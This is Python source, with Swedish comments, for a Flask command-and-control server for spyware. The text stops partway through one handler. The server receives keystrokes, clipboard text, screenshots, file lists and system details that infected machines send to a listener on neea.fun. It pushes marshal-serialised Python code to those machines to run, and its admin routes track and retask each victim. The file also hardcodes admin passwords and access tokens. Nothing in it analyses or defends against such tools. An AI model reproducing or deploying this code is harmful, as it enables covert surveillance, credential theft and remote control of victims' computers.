
#!/usr/bin/python3.13
from flask import Flask, request, jsonify, session, redirect, url_for, render_template, make_response, send_file, send_from_directory
import json
import os
import traceback
from datetime import datetime, timedelta
import re
import urllib.parse
import logging
import marshal
import shutil
import io
import zipfile
import time
import subprocess
import base64
import secrets
import threading

# Importera instruktioner från en separat fil
from instructions import INSTRUCTIONS

# Initialisera Flask med rätt mapp för mallar och statiska filer
app = Flask(__name__, template_folder="templates", static_folder="static")
app.secret_key = "jonnybravobaby!!!"
app.config['SESSION_TYPE'] = 'filesystem'
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=24)

# Konfiguration av kataloger och filer
BASE_DIR = os.path.dirname(os.path.abspath(__file__))  # Hämta katalogen där server.py ligger
LOG_DIRECTORY = os.path.join(BASE_DIR, "logs")
CLIENT_LOGS_DIRECTORY = os.path.join(LOG_DIRECTORY, "clients")
INDEX_FILE = os.path.join(LOG_DIRECTORY, "client_index.json")
ADMIN_CREDENTIALS_FILE = os.path.join(LOG_DIRECTORY, "admin_credentials.json")
PING_STATUS_FILE = os.path.join(LOG_DIRECTORY, "ping_status.json")
SCREENSHOTS_FILE = os.path.join(LOG_DIRECTORY, "screenshots.json")
STATIC_DIRECTORY = os.path.join(BASE_DIR, "static")

# Skapa kataloger om de inte finns
os.makedirs(LOG_DIRECTORY, exist_ok=True)
os.makedirs(CLIENT_LOGS_DIRECTORY, exist_ok=True)
os.makedirs(STATIC_DIRECTORY, exist_ok=True)

# Konfigurera loggning med detaljerad utdata
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(os.path.join(LOG_DIRECTORY, "neea_server.log")),
        logging.StreamHandler()
    ]
)

# Lägg till en handler för debug.log
debug_log_path = os.path.join(LOG_DIRECTORY, "debug.log")
debug_handler = logging.FileHandler(debug_log_path)
debug_handler.setLevel(logging.DEBUG)
debug_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logging.getLogger().addHandler(debug_handler)
logging.info(f"Debugloggning aktiverad till {debug_log_path}")
logging.debug(f"Loggning initialiserad med handlers: neea_server.log, konsol och debug.log")

# Standardadminuppgifter
DEFAULT_ADMIN_USERNAME = "wickey"
DEFAULT_ADMIN_PASSWORD = "lolpol771020!!!"

# Kontrollera att loggkatalogerna är skrivbara
try:
    test_file_path = os.path.join(CLIENT_LOGS_DIRECTORY, "test_write.tmp")
    logging.debug(f"Testar skrivrättigheter för {test_file_path}")
    with open(test_file_path, 'w') as f:
        f.write("Testar skrivrättigheter")
    os.remove(test_file_path)
    logging.info("Loggkatalogerna är skrivbara")
    logging.debug(f"Testet lyckades och {test_file_path} togs bort")
except Exception as e:
    logging.error(f"Fel: Loggkatalogerna är inte skrivbara: {e}")
    logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")

# Serverkonfiguration
SERVER_CONFIG = {
    "server_url": "https://neea.fun/listener/log_receiver",
    "secret_token": "SmpVdUpXMEZKTk5nT2CQWGh4SVFlM3lNUWtDUGZJeEtXM2VkU3RuUExwVg==",
    "send_interval": 3600,
    "size_limit": 1048576
}

# Statusperioder i minuter
ACTIVE_STATUS_MINUTES = 10
ONLINE_THRESHOLD_MINUTES = 15
AUTO_PING_INTERVAL = 3600  # Automatiskt pingintervall i sekunder (1 timme)

# Globala variabler för bakgrundsprocesser
auto_ping_thread = None
auto_ping_running = False

def sanitize_filename(filename):
    """Rensar filnamn genom att ta bort ogiltiga tecken."""
    logging.debug(f"Rensar filnamn: {filename}")
    sanitized = re.sub(r'[^a-zA-Z0-9_-]', '_', str(filename).lower())
    result = sanitized if sanitized else "unknown"
    logging.debug(f"Rensat resultat: {result}")
    return result

def get_client_ip(request):
    """Hämtar både privat och offentlig IP-adress från en förfrågan."""
    logging.debug(f"Hämtar klient-IP från förfråganshuvuden: {dict(request.headers)}")
    private_ip = request.remote_addr or "unknown"
    public_ip = request.headers.get('X-Forwarded-For', request.headers.get('X-Real-IP', private_ip))
    logging.debug(f"Klient-IP: privat: {private_ip}, offentlig: {public_ip}")
    return private_ip, public_ip

def is_client_active(last_activity_str):
    """Kontrollerar om en klient är aktiv baserat på senaste aktivitet."""
    logging.debug(f"Kontrollerar om klienten är aktiv med senaste aktivitet: {last_activity_str}")
    if not last_activity_str:
        logging.debug("Ingen senaste aktivitet angiven, klienten anses inaktiv")
        return False
    try:
        last_activity = datetime.strptime(last_activity_str, "%Y-%m-%d %H:%M:%S")
        now = datetime.now()
        is_active = (now - last_activity) < timedelta(minutes=ACTIVE_STATUS_MINUTES)
        logging.debug(f"Klientens aktivstatus: {is_active}, tidsdifferens: {now - last_activity}")
        return is_active
    except Exception as e:
        logging.error(f"Fel vid kontroll av klientaktivitet: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return False

def update_ping_status(client_id, status):
    """Uppdaterar pingstatus för en klient."""
    logging.debug(f"Uppdaterar pingstatus för klient {client_id} till {status}")
    if not client_id:
        logging.error("Kan inte uppdatera pingstatus: client_id är tomt")
        return False
        
    client_index = {}
    if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
        try:
            logging.debug(f"Laddar client_index från {INDEX_FILE}")
            with open(INDEX_FILE, "r", encoding="utf-8") as f:
                client_index = json.load(f) or {}
            logging.debug(f"Laddade client_index med {len(client_index)} klienter")
        except Exception as e:
            logging.error(f"Fel vid läsning av client_index.json för pinguppdatering: {e}")
            logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
            return False
            
    if client_id in client_index:
        client_index[client_id]["ping_status"] = status
        client_index[client_id]["last_ping"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        logging.debug(f"Uppdaterade klient {client_id} ping_status: {status}, last_ping: {client_index[client_id]['last_ping']}")
        
        try:
            with open(INDEX_FILE, "w", encoding="utf-8") as f:
                json.dump(client_index, f, indent=4)
            logging.info(f"Pingstatus uppdaterad för klient {client_id}: {status}")
            return True
        except Exception as e:
            logging.error(f"Fel vid skrivning till client_index.json för pinguppdatering: {e}")
            logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
            return False
    else:
        logging.warning(f"Kan inte uppdatera pingstatus: klient {client_id} hittades inte i index")
        return False

def update_client_index(client_id, original_user, system, private_ip, public_ip, system_info=None):
    """Uppdaterar klientindex med användar-/systeminformation och tider, samt eventuellt system_info."""
    logging.debug(f"Går in i update_client_index med client_id={client_id}, original_user={original_user}, system={system}, private_ip={private_ip}, public_ip={public_ip}, system_info={system_info}")
    if not client_id:
        logging.error("Kan inte uppdatera klientindex: client_id är tomt")
        return False
        
    client_id = sanitize_filename(client_id)
    client_index = {}
    
    # Ladda befintligt klientindex om det finns
    if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
        try:
            logging.debug(f"Laddar befintligt client_index från {INDEX_FILE}")
            with open(INDEX_FILE, "r", encoding="utf-8") as f:
                client_index = json.load(f) or {}
            logging.debug(f"Laddade client_index med {len(client_index)} klienter")
        except json.JSONDecodeError:
            logging.error("Klientindexfilen innehåller ogiltig JSON. Skapar nytt index.")
            client_index = {}
        except Exception as e:
            logging.error(f"Fel vid läsning av client_index.json: {e}")
            logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
            client_index = {}
    else:
        logging.debug(f"Klientindexfilen hittades inte på {INDEX_FILE}, initialiserar nytt index")
        if os.path.exists(INDEX_FILE) and os.path.isdir(INDEX_FILE):
            logging.warning("Klientindexvägen är en katalog. Tar bort och skapar ny fil.")
            shutil.rmtree(INDEX_FILE)
        client_index = {}

    last_seen = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    logging.debug(f"Sätter last_seen-tidsstämpel: {last_seen}")

    # Om klienten inte finns, initialisera den med grundläggande fält
    if client_id not in client_index:
        client_index[client_id] = {
            "username": original_user[:50] if original_user else "unknown",
            "system": system[:50] if system else "unknown",
            "first_seen": last_seen,
            "last_activity": last_seen,
            "private_ip": private_ip[:40] if private_ip else "unknown",
            "public_ip": public_ip[:40] if public_ip else "unknown",
            "ping_status": "unknown",
            "last_ping": "",
            "instruction": "standard"
        }
        logging.debug(f"Initialiserade ny klientpost för {client_id}")
    else:
        # Uppdatera endast specifika fält och bevara andra
        client_index[client_id]["last_activity"] = last_seen
        client_index[client_id]["private_ip"] = private_ip[:40] if private_ip else "unknown"
        client_index[client_id]["public_ip"] = public_ip[:40] if public_ip else "unknown"
        logging.debug(f"Uppdaterade last_activity, private_ip och public_ip för {client_id}")

    # Lägg till eller uppdatera system_info om det anges
    if system_info:
        logging.debug(f"Uppdaterar klient {client_id} med system_info: {system_info}")
        client_index[client_id].update(system_info)

    # Spara uppdaterat index
    try:
        os.makedirs(os.path.dirname(INDEX_FILE), exist_ok=True)
        logging.debug(f"Sparar uppdaterat client_index till {INDEX_FILE}")
        with open(INDEX_FILE, "w", encoding="utf-8") as f:
            json.dump(client_index, f, indent=4)
        logging.info(f"Klientindex uppdaterat för klient: {client_id}")
        logging.debug(f"Sparade client_index.json med {len(client_index)} klienter")
        return True
    except Exception as e:
        logging.error(f"Fel vid skrivning till client_index.json: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return False

def update_client_instruction(client_id, instruction):
    """Uppdaterar den valda instruktionen för en klient."""
    logging.debug(f"Uppdaterar instruktion för klient {client_id} till {instruction}")
    if not client_id or not instruction:
        logging.error(f"Kan inte uppdatera instruktion: client_id eller instruktion är tomt ({client_id}, {instruction})")
        return False
        
    if instruction not in INSTRUCTIONS:
        logging.error(f"Ogiltig instruktionstyp: {instruction}")
        return False
        
    client_index = {}
    if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
        try:
            logging.debug(f"Laddar client_index för instruktionsuppdatering från {INDEX_FILE}")
            with open(INDEX_FILE, "r", encoding="utf-8") as f:
                client_index = json.load(f) or {}
            logging.debug(f"Laddade client_index med {len(client_index)} klienter")
        except Exception as e:
            logging.error(f"Fel vid läsning av client_index.json för instruktionsuppdatering: {e}")
            logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
            return False
            
    if client_id in client_index:
        client_index[client_id]["instruction"] = instruction
        logging.debug(f"Satte instruktion för {client_id} till {instruction}")
        
        try:
            with open(INDEX_FILE, "w", encoding="utf-8") as f:
                json.dump(client_index, f, indent=4)
            logging.info(f"Instruktion uppdaterad för klient {client_id}: {instruction}")
            return True
        except Exception as e:
            logging.error(f"Fel vid skrivning till client_index.json för instruktionsuppdatering: {e}")
            logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
            return False
    else:
        logging.warning(f"Kan inte uppdatera instruktion: klient {client_id} hittades inte i index")
        return False

def clear_client_logs(client_id):
    """Rensar loggar för en specifik klient."""
    logging.debug(f"Rensar loggar för klient {client_id}")
    if not client_id:
        logging.error("Kan inte rensa loggar: client_id är tomt")
        return False
        
    log_file = os.path.join(CLIENT_LOGS_DIRECTORY, f"{client_id}.log")
    try:
        os.makedirs(os.path.dirname(log_file), exist_ok=True)
        logging.debug(f"Skriver rensad loggpost till {log_file}")
        with open(log_file, 'w', encoding='utf-8') as f:
            f.write(f"Loggar rensade: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("-" * 50 + "\n\n")
        logging.info(f"Loggfil rensad för klient {client_id}")
        return True
    except PermissionError:
        logging.error(f"Tillstånd nekades vid rensning av loggfil för {client_id}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return False
    except Exception as e:
        logging.error(f"Fel vid rensning av loggfil {log_file}: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return False

def ping_client(client_id):
    """Pingar en klient för att kontrollera om den är online."""
    logging.debug(f"Manuell pingförfrågan för klient: {client_id}")
    if not client_id:
        logging.error("Kan inte pinga klient: client_id är tomt")
        return "unknown"
        
    client_index = {}
    if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
        try:
            logging.debug(f"Laddar client_index för ping från {INDEX_FILE}")
            with open(INDEX_FILE, "r", encoding="utf-8") as f:
                client_index = json.load(f) or {}
            logging.debug(f"Laddade client_index med {len(client_index)} klienter")
        except Exception as e:
            logging.error(f"Fel vid läsning av client_index.json för klientping: {e}")
            logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
            return "unknown"
            
    if client_id in client_index:
        try:
            last_activity_str = client_index[client_id].get("last_activity", "1970-01-01 00:00:00")
            last_activity = datetime.strptime(last_activity_str, "%Y-%m-%d %H:%M:%S")
            now = datetime.now()
            status = "online" if (now - last_activity) < timedelta(minutes=ONLINE_THRESHOLD_MINUTES) else "offline"
            logging.debug(f"Pingresultat för {client_id}: {status}, senaste aktivitet: {last_activity_str}")
            update_ping_status(client_id, status)
            logging.info(f"Klient {client_id} pingad: {status}")
            return status
        except Exception as e:
            logging.error(f"Fel vid ping av klient {client_id}: {e}")
            logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
            return "unknown"
    else:
        logging.warning(f"Klient {client_id} hittades inte i klientlistan för ping")
        return "unknown"

def sort_log_entries(log_content, sort_order="newest"):
    """Sorterar loggposter efter datum, om möjligt."""
    logging.debug(f"Sorterar loggposter med sorteringsordning: {sort_order}")
    if not log_content:
        logging.debug("Inget logginnehåll att sortera")
        return ""
    try:
        separator = "-"*50 + "\n\n"
        if separator not in log_content:
            logging.warning("Loggseparator hittades inte vid sortering av loggar.")
            return log_content
        
        log_entries = log_content.split(separator)
        if log_entries and not log_entries[-1].strip():
            log_entries.pop()
        if not log_entries:
            logging.debug("Inga giltiga loggposter att sortera")
            return log_content
        
        dated_entries = []
        for entry in log_entries:
            try:
                date_match = re.search(r'(\d{4}-\d{2}-\d{2}\s\d{2}:\d{2}:\d{2})', entry)
                if date_match:
                    entry_date = datetime.strptime(date_match.group(1), "%Y-%m-%d %H:%M:%S")
                    dated_entries.append((entry_date, entry))
                else:
                    if sort_order == "newest":
                        dated_entries.append((datetime.min, entry))
                    else:
                        dated_entries.append((datetime.max, entry))
            except Exception as e:
                logging.error(f"Fel vid extrahering av datum från loggpost: {e}")
                logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
                dated_entries.append((datetime.min, entry))
        
        if sort_order == "newest":
            dated_entries.sort(key=lambda x: x[0], reverse=True)
        else:
            dated_entries.sort(key=lambda x: x[0])
        
        sorted_content = separator.join([e for _, e in dated_entries])
        if not sorted_content.endswith("\n\n"):
            sorted_content += "\n\n"
        logging.debug(f"Loggposter sorterade framgångsrikt, längd: {len(sorted_content)}")
        return sorted_content
    except Exception as e:
        logging.error(f"Fel vid sortering av loggar: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return log_content

def install_static_files():
    """Installerar HTML-, CSS- och JS-filer i den statiska katalogen."""
    logging.debug("Startar installation av statiska filer")
    try:
        if not os.path.exists(STATIC_DIRECTORY):
            os.makedirs(STATIC_DIRECTORY, exist_ok=True)
            logging.debug(f"Skapade statisk katalog: {STATIC_DIRECTORY}")
            
        templates_dir = os.path.join(BASE_DIR, "templates")
        os.makedirs(templates_dir, exist_ok=True)
        logging.debug(f"Säkerställde att mallkatalogen finns: {templates_dir}")
        
        html_file = os.path.join(BASE_DIR, "index.html")
        css_file = os.path.join(BASE_DIR, "styles.css")
        js_file = os.path.join(BASE_DIR, "script.js")
        
        if os.path.exists(html_file):
            with open(html_file, 'r', encoding='utf-8') as f:
                html_content = f.read()
            viewer_html = os.path.join(templates_dir, "viewer.html")
            with open(viewer_html, 'w', encoding='utf-8') as f:
                f.write(html_content)
            logging.info(f"HTML-fil installerad till {viewer_html}")
            
        if os.path.exists(css_file):
            with open(css_file, 'r', encoding='utf-8') as f:
                css_content = f.read()
            static_css = os.path.join(STATIC_DIRECTORY, "styles.css")
            with open(static_css, 'w', encoding='utf-8') as f:
                f.write(css_content)
            logging.info(f"CSS-fil installerad till {static_css}")
            
        if os.path.exists(js_file):
            with open(js_file, 'r', encoding='utf-8') as f:
                js_content = f.read()
            static_js = os.path.join(STATIC_DIRECTORY, "script.js")
            with open(static_js, 'w', encoding='utf-8') as f:
                f.write(js_content)
            logging.info(f"JS-fil installerad till {static_js}")
            
        logging.debug("Installation av statiska filer slutförd framgångsrikt")
        return True
    except Exception as e:
        logging.error(f"Fel vid installation av statiska filer: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return False

@app.route("/styles.css")
def serve_css():
    logging.debug("Serverar styles.css")
    return send_from_directory(STATIC_DIRECTORY, "styles.css", mimetype="text/css")

@app.route("/script.js")
def serve_js():
    logging.debug("Serverar script.js")
    return send_from_directory(STATIC_DIRECTORY, "script.js", mimetype="application/javascript")

@app.route("/config/get_config", methods=["GET"])
def get_config():
    """Returnerar serverkonfiguration till klienten."""
    client_ip = request.remote_addr
    logging.debug(f"Konfiguration begärd från IP: {client_ip}")
    logging.info(f"Konfiguration begärd från IP: {client_ip}")
    return jsonify(SERVER_CONFIG)

@app.route("/listener/log_receiver", methods=["POST"])
def log_receiver():
    """Tar emot och loggar data från klienten, lagrar system_info i client_index.json."""
    private_ip, public_ip = get_client_ip(request)
    logging.debug(f"Mottog förfrågan från {private_ip}, metod={request.method}")
    logging.debug(f"Förfråganshuvuden: {dict(request.headers)}")
    logging.debug(f"Rå förfråganstext: {request.get_data(as_text=True)}")
    logging.info(f"Mottog klientdata från {private_ip}")

    if request.method != "POST":
        logging.warning(f"Ogiltig metod från {private_ip}: {request.method}")
        return "Metoden är inte tillåten", 405

    # Validera token
    auth_header = request.headers.get("Authorization", "")
    logging.debug(f"Auktoriseringshuvud: {auth_header}")
    if not auth_header or not re.match(r"Bearer\s+(\S+)", auth_header):
        logging.warning(f"Oauktoriserad förfrågan från {private_ip}: Saknar/ogiltigt auktoriseringshuvud")
        return "Oauktoriserad: Saknar eller ogiltigt auktoriseringshuvud", 401

    token_match = re.match(r"Bearer\s+(\S+)", auth_header)
    if not token_match:
        logging.warning(f"Oauktoriserad förfrågan från {private_ip}: Kunde inte extrahera token")
        return "Oauktoriserad: Saknar eller ogiltigt auktoriseringshuvud", 401
        
    token = token_match.group(1)
    logging.debug(f"Extraherad token: {token}")
    if token != SERVER_CONFIG["secret_token"]:
        logging.warning(f"Oauktoriserad förfrågan från {private_ip}: Ogiltig token")
        return "Oauktoriserad: Ogiltig token", 401
    logging.info(f"Token validerad framgångsrikt för {private_ip}")

    # Parsa JSON
    try:
        data = request.get_json()
        logging.debug(f"Parsad JSON-data: {data}")
        if not data:
            logging.error(f"Dålig förfrågan från {private_ip}: Ogiltig JSON")
            return "Dålig förfrågan: Ogiltig JSON", 400
    except Exception as e:
        logging.error(f"Dålig förfrågan från {private_ip}: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return "Dålig förfrågan: Ogiltig JSON", 400

    data_type = data.get("type", "")
    user = data.get("user", "").strip() or "unknown"
    system = data.get("system", "").strip() or "unknown"
    log_data = data.get("data", "")
    logging.debug(f"Extraherade fält - typ: {data_type}, användare: {user}, system: {system}, loggdata: {log_data}")

    if not user:
        user = system if system else "unknown"
    sanitized_user = sanitize_filename(user)
    decoded_data = urllib.parse.unquote(log_data)
    logging.debug(f"Rensad användare: {sanitized_user}, Avkodad data: {decoded_data}")

    if data_type == "system_info":
        try:
            system_info = json.loads(decoded_data)
            logging.debug(f"Parsad system_info: {system_info}")
            update_client_index(sanitized_user, user, system, private_ip, public_ip, system_info)
            logging.info(f"Bearbetade system_info för {sanitized_user}")
        except json.JSONDecodeError as e:
            logging.error(f"Fel vid parsning av system_info JSON: {e}")
            logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
    else:
        # Bygg loggpost
        log_entry = (
            f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | IP (privat): {private_ip} | "
            f"IP (offentlig): {public_ip} | Användare: {user} | System: {system}\n"
        )
        logging.debug(f"Bygger loggpost: {log_entry}")

        if data_type == "clipboard":
            log_entry += f"Urklipp:\n{decoded_data}\n"
            logging.debug(f"Urklippsdata: {decoded_data}")
        elif data_type == "keystrokes":
            if decoded_data.strip() == "New client connected":
                log_entry += "[NY KLIENT ANSLUTEN]\n"
                logging.debug("Meddelande om ny klientanslutning upptäckt")
            else:
                log_entry += f"Tangenttryckningar:\n{decoded_data}\n"
                logging.debug(f"Tangenttrycksdata: {decoded_data}")
        elif data_type == "screenshot":
            log_entry += f"Skärmdump tagen (Base64-data, längd: {len(decoded_data)})\n"
            logging.debug(f"Skärmdumpdatalängd: {len(decoded_data)}")
            try:
                if os.path.exists(SCREENSHOTS_FILE):
                    with open(SCREENSHOTS_FILE, "r", encoding="utf-8") as sf:
                        screenshots_data = json.load(sf)
                    logging.debug(f"Laddade befintlig skärmdumpdata med {len(screenshots_data)} poster")
                else:
                    screenshots_data = []
                    logging.debug(f"Ingen skärmdumpfil hittades, initialiserar tom lista")
            except Exception as e:
                logging.error(f"Fel vid läsning av skärmdumpfil: {e}")
                logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
                screenshots_data = []
            
            screenshot_entry = {
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "user": user,
                "system": system,
                "private_ip": private_ip,
                "public_ip": public_ip,
                "data": decoded_data
            }
            screenshots_data.append(screenshot_entry)
            logging.debug(f"Lade till skärmdumppost: {screenshot_entry}")
            
            try:
                with open(SCREENSHOTS_FILE, "w", encoding="utf-8") as sf:
                    json.dump(screenshots_data, sf, indent=4)
                logging.debug(f"Sparade skärmdumpdata till {SCREENSHOTS_FILE}")
            except Exception as e:
                logging.error(f"Fel vid skrivning av skärmdumpfil: {e}")
                logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        elif data_type == "file_list":
            log_entry += f"Fillista:\n{decoded_data}\n"
            logging.debug(f"Fillistdata: {decoded_data}")
        elif data_type == "file_content":
            log_entry += "Filinnehåll mottaget\n"
            logging.debug("Filinnehåll mottaget")
        else:
            log_entry += f"Okänd datatyp: {data_type}\n{decoded_data}\n"
            logging.warning(f"Okänd datatyp mottagen: {data_type}")

        log_entry += "-"*50 + "\n\n"
        logging.debug(f"Slutförd loggpost: {log_entry}")

        # Skriv till klientlogg
        client_log_file = os.path.join(CLIENT_LOGS_DIRECTORY, f"{sanitized_user}.log")
        logging.debug(f"Förbereder att skriva till klientloggfil: {client_log_file}")
        try:
            os.makedirs(os.path.dirname(client_log_file), exist_ok=True)
            logging.debug(f"Säkerställde att katalogen finns för {client_log_file}")
            with open(client_log_file, "a", encoding="utf-8", errors="replace") as f:
                f.write(log_entry)
            logging.info(f"Skrev loggpost till {client_log_file}")
        except Exception as e:
            logging.error(f"Fel vid skrivning till loggfil {client_log_file}: {e}")
            logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
            return "Internt serverfel: Kunde inte skriva logg", 500

    # Uppdatera index för alla datatyper
    update_client_index(sanitized_user, user, system, private_ip, public_ip)
    logging.info(f"Data bearbetades framgångsrikt för användare: {sanitized_user}")
    return "Data mottagna", 200

@app.route("/get_instructions", methods=["GET"])
def get_instructions():
    """Skickar kompilerade och serialiserade instruktioner till klienten."""
    logging.debug(f"Instruktionsförfrågan mottagen med huvuden: {dict(request.headers)}")
    auth_header = request.headers.get("Authorization", "")
    if not auth_header or not re.match(r"Bearer\s+(\S+)", auth_header):
        logging.warning("Oauktoriserad instruktionsförfrågan: Saknar eller ogiltigt auktoriseringshuvud")
        return "Oauktoriserad", 401
        
    token_match = re.match(r"Bearer\s+(\S+)", auth_header)
    if not token_match:
        logging.warning("Oauktoriserad instruktionsförfrågan: Kunde inte extrahera token")
        return "Oauktoriserad", 401
        
    token = token_match.group(1)
    logging.debug(f"Extraherad token: {token}")
    if token != SERVER_CONFIG["secret_token"]:
        logging.warning("Oauktoriserad instruktionsförfrågan: Ogiltig token")
        return "Oauktoriserad", 401

    client_id = request.args.get("client_id", "")
    instruction_type = "standard"
    logging.debug(f"Klient-ID från förfrågan: {client_id}")

    if client_id:
        client_index = {}
        if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
            try:
                logging.debug(f"Laddar client_index för instruktioner från {INDEX_FILE}")
                with open(INDEX_FILE, "r", encoding="utf-8") as f:
                    client_index = json.load(f) or {}
                logging.debug(f"Laddade client_index med {len(client_index)} klienter")
            except Exception as e:
                logging.error(f"Fel vid läsning av client_index.json för instruktioner: {e}")
                logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        if client_id in client_index:
            instruction_type = client_index[client_id].get("instruction", "standard")
            logging.info(f"Serverar instruktionstyp '{instruction_type}' till klient {client_id}")
        else:
            logging.info(f"Klient {client_id} hittades inte i index, serverar standardinstruktion")

    instruction_code = INSTRUCTIONS.get(instruction_type, INSTRUCTIONS["standard"])
    logging.debug(f"Vald instruktionskodlängd: {len(instruction_code)}")

    try:
        code_object = compile(instruction_code, '<string>', 'exec')
        serialized_code = marshal.dumps(code_object)
        logging.debug(f"Instruktionskod kompilerad och serialiserad, storlek: {len(serialized_code)} byte")
        response = make_response(serialized_code)
        response.headers['Content-Type'] = 'application/octet-stream'
        return response
    except SyntaxError as e:
        logging.error(f"Syntaxfel i instruktionskod '{instruction_type}': {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return "Internt serverfel: Ogiltig instruktionssyntax", 500
    except Exception as e:
        logging.error(f"Fel vid kompilering/serialisering av instruktionskod '{instruction_type}': {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return "Internt serverfel: Misslyckades med att bearbeta instruktioner", 500

@app.route("/api/ping_client", methods=["POST"])
def api_ping_client():
    """API-endpunkt för att pinga en klient."""
    logging.debug(f"Pingklientförfrågan från {request.remote_addr} med data: {request.get_data(as_text=True)}")
    logging.info(f"Pingklientförfrågan från {request.remote_addr}")
    try:
        if request.is_json:
            data = request.get_json()
        else:
            data = {key: request.form[key] for key in request.form}
        logging.debug(f"Parsad förfrågansdata: {data}")
            
        if not data:
            logging.error("Ogiltig data i pingförfrågan")
            return jsonify({"status": "error", "message": "Ogiltigt förfrågningsformat"}), 400
            
        client_id = data.get("client_id")
        if not client_id:
            logging.warning("Ogiltig pingförfrågan: Saknar client_id")
            return jsonify({"status": "error", "message": "Klient-ID krävs"}), 400
    except Exception as e:
        logging.error(f"Fel vid parsning av pingförfrågan: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": f"Ogiltigt förfrågningsformat: {str(e)}"}), 400
    
    try:
        status = ping_client(client_id)
        logging.info(f"Ping lyckades för klient {client_id}: {status}")
        return jsonify({"status": "success", "ping_status": status})
    except Exception as e:
        logging.error(f"Fel vid ping av klient {client_id}: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": f"Fel vid ping av klient: {str(e)}"}), 500

@app.route("/api/update_instruction", methods=["POST"])
def api_update_instruction():
    """API-endpunkt för att uppdatera en klients instruktion."""
    logging.debug(f"Uppdateringsinstruktionsförfrågan från {request.remote_addr} med data: {request.get_data(as_text=True)}")
    logging.info(f"Uppdateringsinstruktionsförfrågan från {request.remote_addr}")
    try:
        if request.is_json:
            data = request.get_json()
            client_id = data.get("client_id")
            instruction = data.get("instruction")
        else:
            client_id = request.form.get("client_id")
            instruction = request.form.get("instruction")
        logging.debug(f"Parsad data - client_id: {client_id}, instruktion: {instruction}")
            
        if not client_id or not instruction:
            logging.warning("Ogiltig instruktionsuppdateringsförfrågan: Saknar client_id eller instruktion")
            return jsonify({"status": "error", "message": "Klient-ID och instruktion krävs"}), 400
            
        if instruction not in INSTRUCTIONS:
            logging.warning(f"Ogiltig instruktionstyp begärd: {instruction}")
            return jsonify({"status": "error", "message": "Ogiltig instruktionstyp"}), 400
        
        success = update_client_instruction(client_id, instruction)
        if success:
            logging.info(f"Instruktion uppdaterad framgångsrikt för klient {client_id}: {instruction}")
            return jsonify({"status": "success"})
        else:
            logging.warning(f"Misslyckades med att uppdatera instruktion för klient {client_id}")
            return jsonify({"status": "error", "message": "Misslyckades med att uppdatera instruktion"}), 500
    except Exception as e:
        logging.error(f"Fel vid uppdatering av instruktion: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": f"Fel vid uppdatering av instruktion: {str(e)}"}), 500

@app.route("/api/clear_logs", methods=["POST"])
def api_clear_logs():
    """API-endpunkt för att rensa en klients loggar."""
    logging.debug(f"Rensa loggförfrågan från {request.remote_addr} med data: {request.get_data(as_text=True)}")
    logging.info(f"Rensa loggförfrågan från {request.remote_addr}")
    try:
        if request.is_json:
            data = request.get_json()
        else:
            data = {key: request.form[key] for key in request.form}
        logging.debug(f"Parsad data: {data}")
            
        if not data:
            logging.error("Ogiltig data i rensa loggförfrågan")
            return jsonify({"status": "error", "message": "Ogiltigt förfrågningsformat"}), 400
            
        client_id = data.get("client_id")
        if not client_id:
            logging.warning("Ogiltig rensa loggförfrågan: Saknar client_id")
            return jsonify({"status": "error", "message": "Klient-ID krävs"}), 400
    except Exception as e:
        logging.error(f"Fel vid parsning av rensa loggförfrågan: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": f"Ogiltigt förfrågningsformat: {str(e)}"}), 400
    
    try:
        success = clear_client_logs(client_id)
        if success:
            logging.info(f"Loggar rensade framgångsrikt för klient {client_id}")
            return jsonify({"status": "success", "message": "Loggar rensade framgångsrikt"})
        else:
            logging.warning(f"Misslyckades med att rensa loggar för klient {client_id}")
            return jsonify({"status": "error", "message": "Misslyckades med att rensa loggar"}), 500
    except Exception as e:
        logging.error(f"Fel vid rensning av loggar för klient {client_id}: {e}")
